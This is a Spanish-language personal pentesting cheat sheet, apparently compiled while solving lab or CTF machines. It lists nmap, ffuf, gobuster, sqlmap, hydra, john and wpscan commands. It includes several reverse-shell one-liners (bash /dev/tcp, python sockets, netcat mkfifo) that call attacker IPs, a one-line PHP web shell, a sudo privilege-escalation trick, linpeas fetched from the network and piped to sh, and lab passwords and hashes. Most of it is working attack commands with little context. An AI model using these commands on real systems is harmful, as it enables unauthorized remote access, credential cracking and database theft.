

## nmap

### 2.1 uso basico de nmap
```bash
nmap -sP 192.168.1.0/24 
nmap -sn 192.168.1.0/24 
nmap -Pn 192.168.1.7
```

-sP: barrido de una red haciendo ping
-sn: sin necesidad de hacer ping
-Pn analizar los puertos de una ip

### 2.2 uso intermedio Nmap

``` bash
nmap -sT 192.168.1.7 
nmap -sU 192.168.1.7 
nmap -p135,139,445 192.168.1.7 
nmap -p135,139,445 -n 192.168.1.7 
nmap -p- 192.168.1.7 
```

- -sT solo puertos TCP
- -sU solo puertos UDP
- -n no saca el dns
- -p- saca todos los puertos

### 2.3 uso avanzado Nmap

```bash
nmap -sP 192.168.0/24
nmap -Pn -iL /home/kali/ip.txt
nmap -sV 192.168.0.7
nmap -sC 192.168.0.7
nmap -A 192.168.0.7
nmap -stats-every 10s -A 192.168.0.10
```

- sV saca la version de servicio de cada puerto
- sC una serie de script extras
- O saca la version del SO
- A es una combinacion de -sV -O -sC 
- stats-every 10s cada 10 segundos mostrara el avance que lleva

```bash
nmap 192.168.0.1/24
nmap -sV -p- 192.168.0.158
enum4linux -a 192.168.0.158
```

```bash
sudo nmap -sCV -p-  192.168.78.131 -oN targeted
```

## netdiscover

```bash
sudo netdiscover -r 192.168.78.0/24
```

## shel reversa netcat


```bash
bash -i ->&/dev/tcp/192.168.0.35/1234 0>&1

sudo nc -lvp 1234
```

```bash
os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.201.129/8080 0>&1'")

sudo nc -lvp 8080
```

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'        
```

### shell reverse python

```python 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
sudo nc -lvp 1234
```

```bash
/bin/bash -i >& /dev/tcp/192.168.0.45/1234 0>&1
```

## enum4linux/SMB

```bash
enum4linux -a 192.168.0.158
```

## ffuf

```bash
ffuf -c -ic -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.191/~secret/FUZZ
ffuf -c -ic -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.191/~secret/.FUZZ -fc 403 -e .txt,.html
```

## cipher-identifier

```bash
https://www.dcode.fr/cipher-identifier

curl http://192.168.0.191/~secret/.mysecret.txt | base58 -d > sshkey
```
	el archivo sshkey debe tener un salto de linea al final del archivo para que no de error


## ssh2john

```bash
locate ssh2john
/usr/share/john/ssh2john.py sshkey > hash
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash

ssh -i sshkey icex64@192.168.201.131
```

```bash
sudo john hash --show
```


## sudoers

```bash
sudo -l
```

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'        
```

### gtfbins

```bash
https://gtfobins.github.io/
```

## linpeas

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## reverse shell

```bash
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```

## gitdumper

```bash
git clone https://github.com/internetwache/GitTools
cd GitTools/Dumper

./gitdumper.sh http://devguru.local/.git/ website
 ./extractor.sh ../Dumper/website ./website
```

## bcrypt-hash-generator

```bash
https://www.devglan.com/online-tools/bcrypt-hash-generator
```

## PHP
```php
shell_exec($_GET['cmd']);
```

## sqlite

```bash
sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/bash'
```

## git_dumper

```python
https://github.com/arthaud/git-dumper

python3 git_dumper.py http://192.168.78.129/.git/ website
```

## sqlmap

```bash
sudo sqlmap -r sql --dbs --batch
sudo sqlmap -r sql -D darkhole_2 --dump-all --batch


sudo sqlmap -u http://192.168.78.129/dashboard.php?id=1 --cookie='PHPSESSID=kq2c1ldquq8lfpoe2uosnlqmfp' --dbms=mysql --current-db
sudo sqlmap -u http://192.168.78.129/dashboard.php?id=1 --dbms=mysql --current-db


sudo sqlmap -u http://192.168.78.129/dashboard.php?id=1 --dbms=mysql --current-db -D darkhole_2 --tables
sudo sqlmap -u http://192.168.78.129/dashboard.php?id=1 --dbms=mysql --current-db -D darkhole_2 --tables --dump-all
sudo sqlmap -u http://192.168.78.129/dashboard.php?id=1 --dbms=mysql --current-db -D darkhole_2 ssh --dump
```

## linPEAS

```bash
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## port forwarding

```bash
ssh jehad@192.168.78.129 -L 9999:localhost:9999
```

```bash
bash -c 'bash -i  >& /dev/tcp/192.168.78.128/8888 0>&1'
```


## python

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

```bash 
sudo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.78.128",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## wfuzz

```bash
sudo wfuzz -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt --hc 403,404  http://192.168.78.130:10000/FUZZ
```

## nikto

```bash
sudo nikto -h http://192.168.78.130:10000
```

## dirb 

```bash
dirb http://192.168.78.131/
```

## gobuster 

```bash
sudo apt update
sudo apt install gobuster
sudo gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt


sudo gobuster dir -u http://192.168.0.10/ -w /usr/share/wordlists/dirb/common.txt
sudo gobuster dir -u http://192.168.0.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
sudo gobuster dir -u http://192.168.0.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
sudo gobuster dir -u http://192.168.0.10:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```

## wordpress

```bash
dirb http://192.168.78.131/
sudo gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt

sudo wpscan --url http://raven.local/wordpress -e u
```

## ssh

```bash
ssh michael@192.168.78.131
pass: michael (usuario sacado del wpscan)
```

## hydra

```bash
sudo hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.78.131

sudo gunzip /usr/share/wordlists/rockyou.txt.gz
sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.10
sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt
```

## mysql

```bash
mysql -u root -pR@v3nSecurity
```

## john

```bash
steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/

vi stevenhash
$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/

sudo john stevenhash
```

## sudo -l

```bash
su steven
pass encontrada con john "pink84"
bash
sudo -l

sudo python -c 'import os; os.system("/bin/bash")'
sudo python -c 'import pty; pty.spawn("/bin/bash")'

cd /root
```

## CyberChef

```bash
https://gchq.github.io/CyberChef/
```

## PayloadsAllTheThings

```bash
https://github.com/swisskyrepo/PayloadsAllTheThings

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

### ### Netcat OpenBsd

```shell
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f


rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.45 1234 >/tmp/f

sudo nc -lvp 1234
```

## wpscan

```bash
wpscan --url http://wordpress.local -e u --wp-content-dir wp-content

wpscan --url http://wordpress.local --passwords /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```



